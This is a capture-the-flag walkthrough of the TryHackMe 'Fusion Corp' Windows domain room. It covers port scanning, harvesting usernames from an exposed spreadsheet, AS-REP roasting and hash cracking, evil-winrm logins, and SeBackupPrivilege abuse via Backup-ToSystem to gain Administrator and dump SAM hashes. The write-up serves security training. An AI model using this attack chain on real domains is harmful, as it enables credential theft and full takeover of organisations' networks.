---
categories: [TryHackMe]
tags: [ SeBackupPrivilege, secretsdump, BloodHound, Active Directory, ASREPRoast, PrivEsc, Backup-ToSystem]
media_subpath: /assets/images/
image:
  alt: Windows Hard Level Machine 👹
  width: "1200"
  height: "630"
  path: https://tryhackme-images.s3.amazonaws.com/room-icons/c7c5cbaebf5b3c858e7c37f4213ab6e1.jpeg
---

| Machine Link       | [https://tryhackme.com/r/room/fusioncorp](https://tryhackme.com/r/room/fusioncorp) |
| ------------------ | ---------------------------------------------------------------------------------- |
| Operating System   | <mark style="background: #FFB86CA6;">Windows (Active Directory)</mark>                                                         |
| Difficulty         | <mark style="background: #FF5582A6;"> Hard </mark>                                                                               |
| Machine Created by | [MrSeth6797](https://tryhackme.com/p/MrSeth6797)                                   |

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Fusion_corp]
└─$ nmap -sC -sV -T4 -p- -oN Nmap_Results.txt -Pn 10.10.111.199
Nmap scan report for 10.10.111.199
Host is up (0.30s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: eBusiness Bootstrap Template
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-19 09:10:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-03-19T09:11:55+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2024-03-18T08:59:36
|_Not valid after:  2024-09-17T08:59:36
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   DNS_Tree_Name: fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-19T09:11:16+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-03-19T09:11:20
|_  start_date: N/A

Service detection performed.
```
{: .nolineno}

## Web Enumeration ⤵️

I checked port 80 and found this static page no any interesting Users found through dashboard users faces.

![Image](Pasted%20image%2020240320222825.png)
_Dashboard Page_

I then looked for directory or files bruteforcing and I found some indexed directories through <mark style="background: #FF5582A6;">feroxbuster</mark> Tool like this 🔻

![Image](Pasted%20image%2020240320223659.png)
_Feroxbuster Output_

I looked into it and found this `employee.ods` file .

![Image](Pasted%20image%2020240320095826.png)
_employee.ods file_

Lets check this file and I found a bunch of other files so I extracted it and opened this <span style="color:#ffc000">content.xml</span> file that contains that usernames 🔽

![Image](Pasted%20image%2020240320095935.png)
_content.xml file_

Lets extract the usernames and save them in a file : 

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Fusion_corp/employees]
└─$ cat content.xml | sed "s/></>\n</g" | grep '<text:p>' | cut -d '>' -f 2 | cut -d '<' -f 1 
Name
Username
Jhon Mickel
jmickel
Andrew Arnold
aarnold
Lellien Linda
llinda
Jhon Powel
jpowel
Dominique Vroslav
dvroslav
Thomas Jeffersonn
tjefferson
Nola Maurin
nmaurin
Mira Ladovic
mladovic
Larry Parker
lparker
Kay Garland
kgarland
Diana Pertersen
dpertersen

```
{: .nolineno}

Lets look for AS-REP-ROSTABLE users that can extract the TGT ticket which helps the attacker to crack the password out of it with <mark style="background: #FF5582A6;">GetNPUsers.py</mark> Tool.

![Image](Pasted%20image%2020240320095750.png)
_GetNPUsers.py Tool_

I get the Ticket from this user <span style="color:#fd77f8">lparker</span> lets crack this hash value with John The Ripper Tool.

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Fusion_corp/employees]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD> ($krb5asrep$23$lparker@FUSION.CORP)     
1g 0:00:00:10 DONE (2024-03-20 09:55)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
{: .nolineno}

I got the password so lets see what privileges does this user have with <mark style="background: #FF5582A6;">netexec</mark> Tool.

![Image](Pasted%20image%2020240320100146.png)
_Got privileges of SMB,winrm,RDP services_

### WINRM Session ⏬ 

Lets have <span style="color:#fd77f8">lparker</span> user winrm session now ⏬

![Image](Pasted%20image%2020240320100528.png)
_FLAG.txt file from lparker user_

with Bloodhound I checked user <span style="color:#fd77f8">jmurphy</span> account and I got this information from its description 🔽

![Image](Pasted%20image%2020240320112049.png)
_BloodHound Description_

I got the password of jmurphy user so lets have it's winrm session now as we are Lateral moving so 🔻 
```powershell
┌──(kali㉿kali)-[~/Downloads/Tryhackme/Fusion_corp]
└─$ evil-winrm -i 10.10.111.223 -u jmurphy -p '<PASSWORD>'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jmurphy\Documents> cd ..
*Evil-WinRM* PS C:\Users\jmurphy> whoami
fusion\jmurphy
*Evil-WinRM* PS C:\Users\jmurphy> tree /f /a
Folder PATH listing
Volume serial number is 82D1-EB4D
C:.
+---Desktop
|       flag.txt
|
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
\---Videos
*Evil-WinRM* PS C:\Users\jmurphy> cat Desktop\flag.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG_FLAG}
*Evil-WinRM* PS C:\Users\jmurphy> 
```
{: .nolineno}

I checked the privileges and found this user is a part of <mark style="background: #D2B3FFA6;">Backup Operator</mark> group so I tried this Tool [Backup-ToSystem.ps1](https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Backup-ToSystem.ps1) .

```powershell
*Evil-WinRM* PS C:\Users\jmurphy> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ======================================fusion\jmurphy S-1-5-21-1898838421-3672757654-990739655-1104


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===========================================Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\jmurphy>
```
{: .nolineno}

I found this Tool from this [Blog](https://www.hackplayers.com/2020/06/backup-tosystem-abusando-de-los.html) post . The tool mainly checks the <mark style="background: #BBFABBA6;">SeBackupPrivilege</mark> Enable and then apply changes according to the ACL permissions like to add a user or doing any task as `nt \authority system` user. 

![Image](Pasted%20image%2020240320220215.png)
_winrm session as jmurpy user_

I then ran the <span style="color:#ffc000">Backup-ToSystem</span> command that allows me to execute any command 🔽

![Image](Pasted%20image%2020240320220347.png)![Image](Pasted%20image%2020240320220413.png)
_Backup-ToSystem Command_

Lets add this user in Administrators group with this command 🔽

![Image](Pasted%20image%2020240320220543.png)

Lets check now 🔻

![Image](Pasted%20image%2020240320220648.png)
_user information_

As the user <span style="color:#fd77f8">jmurphy</span> is a part of <span style="color:#00ff91">Administrators</span> group so lets dump the SAM with <mark style="background: #FF5582A6;">netexec</mark> Tool command like this 🔽

![Image](Pasted%20image%2020240320220921.png)
_Netexec SMB enumeration of SAM hashes_

But through <span style="color:#fd77f8">jmurphy</span> also I can dump the flag like this now 🔽

```powershell
*Evil-WinRM* PS C:\Users\jmurphy\Documents> cd ../../Administrator
*Evil-WinRM* PS C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is 82D1-EB4D
C:.
+---3D Objects
+---Contacts
+---Desktop
|       flag.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
cat D*Evil-WinRM* PS C:\Users\Administrator> cat Desktop/flag.txt
THM{FLAG_FLAG_FLAG_FLAG_FLAG}
*Evil-WinRM* PS C:\Users\Administrator>
```
{: .nolineno}

I am Administrator Now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }